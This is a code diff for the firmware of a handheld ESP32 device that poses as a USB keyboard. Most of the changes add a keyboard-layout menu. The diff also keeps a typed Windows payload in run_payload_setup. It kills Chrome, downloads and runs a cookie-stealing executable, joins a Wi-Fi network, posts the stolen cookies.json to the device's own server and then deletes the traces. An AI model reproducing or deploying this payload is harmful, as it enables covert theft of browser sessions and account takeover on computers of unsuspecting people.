@@ -4,7 +4,7 @@
 #include <WiFiMulti.h>
 #include <WiFiClientSecure.h>
 #include "USB.h"
-#include "src/USB/src/USBHIDKeyboard.h"
+#include "src/USB/lib/USBHIDKeyboard.h"
 #include <ESPAsyncWebServer.h>
 
 #define FILES_DIR "/win-chrm"
@@ -22,6 +22,7 @@ struct MENUL {
   int command;
 };
 
+int current_layout = 0;
 void rootPayload0(void);
 void demo_android(void);
 void demo_ios(void);
@@ -29,53 +30,34 @@ void demo_macos(void);
 void demo_windows(void);
 void demo_char_test(void);
 
-void writeWLayout(const char * str)
-{
-    int len = strlen(str);
-    for (int i = 0; i < len; i++) {
-        switch(str[i]) {
-          case '#':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(KEY_QUOTE); 
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          case '@':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(KEY_SEMICOLON);
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          case '[':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(KEY_LEFT_BRACE);
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          case ']':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(KEY_RIGHT_BRACE); 
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          case '{':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(HID_KEY_SHIFT_LEFT);
-            Keyboard.pressRaw(KEY_LEFT_BRACE); 
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          case '}':
-            Keyboard.pressRaw(HID_KEY_ALT_RIGHT);
-            Keyboard.pressRaw(HID_KEY_SHIFT_LEFT);  
-            Keyboard.pressRaw(KEY_RIGHT_BRACE);
-            delay(100);
-            Keyboard.releaseAll();
-            break;
-          default:
-            Keyboard.press(str[i]);          // Keydown
-            Keyboard.release(str[i]);        // Keyup       
-        }
+static MENUL layouts[] = { // edit this to add layouts!
+  { TXT_BACK, 5},
+  { "en-US", 0},
+  { "it-IT", 1},
+  { "pt-BR", 2},
+};
+
+int layouts_size = sizeof(layouts) / sizeof (MENUL);
+
+void layouts_menu(int option){ // edit this to add layouts!
+    rstOverride = true;
+    isSwitching = true;
+    current_proc = 25;
+    switch(option) {
+      case 0:
+        current_layout = 0;
+        break;
+      case 1:
+        current_layout = 1;
+        break;
+      case 2:
+        current_layout = 2;
+        break;
+      case 5:
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 1;
+        break;
     }
 }
 
@@ -96,7 +78,7 @@ void payloads_menu(int option){ // edit this to add payloads!
       case 0:
         rstOverride = false;
         isSwitching = true;
-        current_proc = 1;
+        current_proc = 24;
         break;
       case 1:
         rootPayload0();
@@ -158,7 +140,7 @@ void demo_ios(){ // 3
 }
 
 void demo_macos(){ // 4
-    Keyboard.begin(1);
+    Keyboard.begin(current_layout);
     USB.begin();
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
@@ -179,7 +161,7 @@ void demo_macos(){ // 4
 }
 
 void demo_windows(){ // 5
-    Keyboard.begin(1);
+    Keyboard.begin(current_layout);
     USB.begin();
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
@@ -203,7 +185,7 @@ void demo_windows(){ // 5
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     delay(2000);
-    writeWLayout("curl https://raw.githubusercontent.com/usg-ishimura/m5stick-nemo/main/ascii/NEMO.txt");
+    Keyboard.writeWLayout("curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/NEMO.txt");
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     DISP.print("done.");
@@ -211,7 +193,7 @@ void demo_windows(){ // 5
 }
 
 void demo_char_test(){ // 6
-    Keyboard.begin(1);
+    Keyboard.begin(current_layout);
     USB.begin();
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
@@ -227,8 +209,7 @@ void demo_char_test(){ // 6
     // delay(500);
     // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
 
-    //Keyboard.print(" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}");
-    writeWLayout(" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}");
+    Keyboard.writeWLayout(" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}`~");
     DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
 }
@@ -342,28 +323,24 @@ IPAddress runPayloadServer(){
 }
 
 void run_payload_setup(){
-  Keyboard.begin(1);
+  Keyboard.begin(current_layout);
   USB.begin();
   DISP.fillScreen(BGCOLOR);
   DISP.setCursor(0, 0);
   IPAddress IP = runPayloadServer();
   String str = ip2String(IP);
 
-  char * cmd1 = "taskkill /F /IM chrome.exe /T \
+  String cmd = "taskkill /F /IM chrome.exe /T \
 & cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\" \
 && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe \
 && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml \
 && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\" \
-&& netsh wlan connect name=";
-  char * cmd2 =" && .\\GCC-stealer.exe --json-file \
+&& netsh wlan connect name="+ssid+" && .\\GCC-stealer.exe --json-file \
 && timeout /t 5 \
-&& curl -X POST -F data=@cookies.json http://";
-  char * cmd3 ="/upload \
-& netsh wlan delete profile ";
-  char * cmd4 =" & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";
+&& curl -X POST -F data=@cookies.json http://"+str+"/upload \
+& netsh wlan delete profile "+ssid+" & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";
 
-  String cmd_final = cmd1 + ssid + cmd2 + str + cmd3 + ssid + cmd4;
-  const char *cmd_complete = cmd_final.c_str();
+  const char *cmd_final = cmd.c_str();
   
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Running payload...");
@@ -376,7 +353,7 @@ void run_payload_setup(){
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(2000);
-  writeWLayout(cmd_complete);
+  Keyboard.writeWLayout(cmd_final);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   DISP.print("done.");
@@ -433,6 +410,34 @@ void drawmenuL() {
         DISP.setTextColor(BGCOLOR, FGCOLOR);
       }
       DISP.printf(" %-19s\n",bumenu[i].name);
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  }
+}
+
+void drawmenuLO() {
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0, 1);
+  // scrolling menu
+  if (cursor < 0) {
+    cursor = layouts_size - 1;  // rollover hack for up-arrow on cardputer
+  }
+  if (cursor > 5) {
+    for ( int i = 0 + (cursor - 5) ; i < layouts_size ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.printf(" %-19s\n",layouts[i].name);
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  } else {
+    for (
+      int i = 0 ; i < layouts_size ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.printf(" %-19s\n",layouts[i].name);
       DISP.setTextColor(FGCOLOR, BGCOLOR);
     }
   }
